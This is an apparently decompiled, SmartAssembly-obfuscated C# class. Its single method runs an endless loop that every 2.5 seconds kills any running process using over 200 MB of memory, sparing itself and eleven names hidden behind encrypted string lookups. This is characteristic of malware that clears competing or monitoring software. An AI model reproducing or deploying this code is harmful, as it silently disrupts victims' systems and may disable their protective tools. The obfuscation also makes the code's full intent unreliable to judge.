using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace coxZRmDhvSAWo;

public static class xthKWmEVlgYHOS
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void OGRDaEslLrcJ()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107399132)) && !process.ProcessName.Contains(getString_0(107399123)) && !process.ProcessName.Contains(getString_0(107399146)) && !process.ProcessName.Contains(getString_0(107399137)) && !process.ProcessName.Contains(getString_0(107399092)) && !process.ProcessName.Contains(getString_0(107399111)) && !process.ProcessName.Contains(getString_0(107398554)) && !process.ProcessName.Contains(getString_0(107398573)) && !process.ProcessName.Contains(getString_0(107398560)) && !process.ProcessName.Contains(getString_0(107398515)) && !process.ProcessName.Contains(getString_0(107398494)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static xthKWmEVlgYHOS()
	{
		Strings.CreateGetStringDelegate(typeof(xthKWmEVlgYHOS));
	}
}
